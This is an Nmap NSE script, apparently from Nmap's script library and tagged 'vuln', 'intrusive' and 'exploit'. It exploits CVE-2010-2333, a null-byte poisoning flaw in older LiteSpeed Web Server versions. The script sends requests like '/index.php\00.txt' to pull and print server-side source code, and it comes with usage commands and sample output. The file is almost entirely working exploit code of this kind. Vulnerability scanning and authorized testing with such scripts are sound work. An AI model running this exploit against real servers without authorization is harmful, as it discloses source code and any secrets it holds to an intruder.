local http = require "http"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

description = [[
Exploits a null-byte poisoning vulnerability in Litespeed Web Servers 4.0.x
before 4.0.15 to retrieve the target script's source code by sending a HTTP
request with a null byte followed by a .txt file extension (CVE-2010-2333).

If the server is not vulnerable it returns an error 400. If index.php is not
found, you may try /phpinfo.php which is also shipped with LiteSpeed Web
Server. The attack payload looks like this:
* <code>/index.php\00.txt</code>

References:
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2333
* http://www.exploit-db.com/exploits/13850/
]]

---
-- @usage
-- nmap -p80 --script http-litespeed-sourcecode-download --script-args http-litespeed-sourcecode-download.uri=/phpinfo.php <host>
-- nmap -p8088 --script http-litespeed-sourcecode-download <host>
--
-- @output
-- PORT     STATE SERVICE    REASON
-- 8088/tcp open  radan-http syn-ack
-- | http-litespeed-sourcecode-download.nse: /phpinfo.php source code:
-- | <HTML>
-- | <BODY>
-- |    <?php phpinfo() ?>
-- | </BODY>
-- |_</HTML>
--
-- @args http-litespeed-sourcecode-download.uri URI path to remote file
---

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive", "exploit"}


portrule = shortport.http

action = function(host, port)
  local output = {}
  local rfile = stdnse.get_script_args("http-litespeed-sourcecode-download.uri") or "/index.php"

  stdnse.debug1("Trying to download the source code of %s", rfile)
  --we append a null byte followed by ".txt" to retrieve the source code
  local req = http.get(host, port, rfile.."\00.txt")

  --If we don't get status 200, the server is not vulnerable
  if req.status then
    if req.status ~= 200 then
      if req.status == 400 and nmap.verbosity() >= 2 then
        output[#output+1] = "Request with null byte did not work. This web server might not be vulnerable"
      elseif req.status == 404 and nmap.verbosity() >= 2 then
        output[#output+1] = string.format("Page: %s was not found. Try with an existing file.", rfile)
      end
      stdnse.debug2("Request status:%s body:%s", req.status, req.body)
    else
      output[#output+1] = "\nLitespeed Web Server Source Code Disclosure (CVE-2010-2333)"
      output[#output+1] = string.format("%s source code:", rfile)
      output[#output+1] = req.body
    end
  end

  if #output>0 then
    return stdnse.strjoin("\n", output)
  end
end
